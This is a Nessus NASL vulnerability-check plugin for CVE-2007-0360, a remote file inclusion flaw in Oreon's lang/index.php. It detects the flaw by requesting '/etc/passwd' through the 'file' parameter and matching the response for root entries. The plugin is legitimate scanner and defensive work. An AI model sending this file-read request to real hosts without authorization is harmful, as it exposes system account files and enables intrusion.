#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(24228);
  script_version("1.17");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2007-0360");
  script_bugtraq_id(22107);
  script_xref(name:"EDB-ID", value:"3150");

  script_name(english:"Oreon lang/index.php file Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Oreon, a web-based network supervision
program based on Nagios. 

The installation of Oreon on the remote host fails to sanitize input
to the 'file' parameter of the 'lang/index.php' script before using it
to include PHP code.  Regardless of PHP's 'register_globals' setting,
an unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/02/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/01/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/oreon", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  file = "/etc/passwd";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/lang/index.php?",
      "file=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # it looks like Oreon's lang/index.php script and...
    "<title> Traduction </title>" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
  )
  {
    contents = NULL;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ("</center>" >< contents) contents = strstr(contents, "</center>") - "</center>";
      if ("</body>" >< contents) contents = contents - strstr(contents, "</body>");

    }

    if (contents)
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the repeated contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
